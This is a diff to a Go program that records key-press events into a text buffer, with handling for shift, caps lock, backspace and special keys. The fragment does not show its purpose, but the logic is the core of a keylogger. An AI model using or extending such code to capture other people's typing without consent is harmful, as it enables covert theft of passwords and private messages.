@@ -46,6 +46,7 @@ func main() {
 	shiftActive := false
 	capsLockActive := false
 
+	// Shift mapping for special characters
 	shiftMappings := map[string]string{
 		"1": "!", "2": "@", "3": "#", "4": "$", "5": "%",
 		"6": "^", "7": "&", "8": "*", "9": "(", "0": ")",
@@ -70,11 +71,11 @@ func main() {
 				if e.KeyPress() {
 					switch keyStr {
 					case "SPACE":
-						cache += (" ")
+						cache += " "
 					case "ENTER":
-						cache += ("\n")
+						cache += "\n"
 					case "TAB":
-						cache += ("\t")
+						cache += "\t"
 					case "BS", "BACKSPACE":
 						if len(cache) > 0 {
 							cache = cache[:len(cache)-1]
@@ -88,8 +89,13 @@ func main() {
 							} else {
 								keyStr = strings.ToLower(keyStr)
 							}
+						} else if len(keyStr) == 1 && keyStr >= "A" && keyStr <= "Z" {
+							if !capsLockActive && !shiftActive {
+								keyStr = strings.ToLower(keyStr)
+							}
 						}
-						cache += (keyStr)
+
+						cache += keyStr
 					}
 				}
 			}
